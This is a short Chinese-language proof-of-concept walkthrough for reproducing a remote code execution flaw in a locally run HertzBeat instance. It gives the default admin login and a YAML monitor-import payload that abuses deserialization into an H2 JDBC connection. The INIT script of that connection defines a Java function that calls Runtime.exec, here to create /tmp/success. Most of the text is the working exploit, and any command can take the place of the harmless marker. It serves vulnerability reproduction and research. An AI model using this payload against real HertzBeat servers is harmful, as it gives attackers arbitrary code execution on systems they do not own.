开启环境：
```
docker compose up -d
```
访问页面：
```
http://localhost:1157/dashboard
```
用户名：admin
密码：hertzbeat
登录后打开任意监控页面
找到导入监控
将文件夹内的`poc.ymal`文件导入：
```
!!org.h2.jdbc.JdbcConnection [ "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\"touch /tmp/success\")\\; }$$\\;CALL EXEC ()\\;", [], "a", "b", false ]
```
然后进入容器内查看即可